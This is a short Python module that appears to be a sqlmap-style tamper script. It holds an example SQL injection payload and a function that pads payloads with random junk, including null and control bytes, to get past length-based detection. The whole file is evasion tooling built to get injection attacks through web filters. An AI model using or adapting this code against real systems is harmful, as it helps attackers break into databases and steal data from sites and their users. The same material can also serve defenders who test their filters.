import random

__example_payload__ = "' AND 1=1 UNION SELECT NULL--"
__type__ = "buffer overflow style padding to bypass length-based detection"


def tamper(payload, **kwargs):
    if payload:
        padding_chars = ['A', ' ', '\t', '\x00', '\x01']
        pad_amount = random.randint(128, 1024)
        retval = payload + ''.join(random.choice(padding_chars) for _ in range(pad_amount))
        return retval
    return payload
